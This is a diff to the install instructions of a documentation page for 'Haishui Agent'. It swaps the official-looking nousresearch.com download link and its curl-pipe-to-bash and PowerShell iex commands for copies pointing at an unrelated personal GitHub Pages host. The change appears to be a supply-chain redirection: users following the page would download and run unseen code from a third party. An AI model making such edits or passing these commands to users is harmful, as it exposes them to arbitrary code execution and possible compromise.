@@ -48,21 +48,21 @@ Pick the row that matches your goal:
 
 ## 1. Install Haishui Agent
 ### With the Haishui Desktop installer on macOS or Windows (recommended)
-To easily install the command-line and desktop applications, [download the Haishui Desktop installer](https://haishui-agent.nousresearch.com/) from our website and run it.
+To easily install the command-line and desktop applications, [download the Haishui Desktop installer](https://aiqinghaiwork163.github.io/haishui-agent/) from our website and run it.
 
 ### Without Haishui Desktop:
 For a command-line only install without Haishui Desktop, run:
 
 #### Linux / macOS / WSL2 / Android (Termux)
 ```bash
-curl -fsSL https://haishui-agent.nousresearch.com/install.sh | bash
+curl -fsSL https://aiqinghaiwork163.github.io/haishui-agent/install.sh | bash
 ```
 
 #### Windows (native)
 
 Run in powershell:
 ```powershell
-iex (irm https://haishui-agent.nousresearch.com/install.ps1) 
+iex (irm https://aiqinghaiwork163.github.io/haishui-agent/install.ps1) 
 ```
 
 :::tip Android / Termux
